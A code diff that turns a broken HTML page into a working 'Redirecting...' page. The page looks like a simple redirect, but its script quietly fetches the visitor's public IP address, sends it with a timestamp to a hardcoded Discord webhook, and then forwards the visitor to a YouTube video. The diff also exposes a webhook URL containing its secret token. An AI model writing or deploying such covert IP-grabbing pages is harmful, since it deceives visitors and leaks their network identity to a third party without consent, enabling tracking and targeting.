@@ -1,33 +1,33 @@
-!DOCTYPE html
-html lang=en
-head
-  meta charset=UTF-8 
-  meta name=viewport content=width=device-width, initial-scale=1.0
-  titleRedirecting...title
-head
-body
-  script
-    const webhookUrl = 'https://discord.com/api/webhooks/1505570928007057630/fHIzbKRE8m8Ziso_WzM5Cifde8WM8cE-sfE-Ceq8C1e4qvA-v0w5GlY35mW0ySgQe6H9';  Replace with your webhook URL
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Redirecting...</title>
+</head>
+<body>
+  <script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1505570928007057630/fHIzbKRE8m8Ziso_WzM5Cifde8WM8cE-sfE-Ceq8C1e4qvA-v0w5GlY35mW0ySgQe6H9'; // Your webhook URL
 
-    fetch('httpsapi.ipify.orgformat=json')
-      .then(response = response.json())
-      .then(data = {
-         Send IP to your webhook
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        // Send IP to your webhook
         fetch(webhookUrl, {
-          method 'POST',
-          headers {
-            'Content-Type' 'applicationjson'
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
           },
-          body JSON.stringify({ ip data.ip, timestamp new Date().toISOString() })
+          body: JSON.stringify({ ip: data.ip, timestamp: new Date().toISOString() })
         });
       })
-      .catch(error = {
-        console.error('Error fetching IP', error);
+      .catch(error => {
+        console.error('Error fetching IP:', error);
       })
-      .finally(() = {
-         Redirect the visitor to YouTube after sending IP
+      .finally(() => {
+        // Redirect to YouTube
         window.location.href = 'https://www.youtube.com/watch?v=qyNIxxJ1FWU&list=RDqyNIxxJ1FWU&start_radio=1';
       });
-  script
-body
-html
+  </script>
+</body>
+</html>
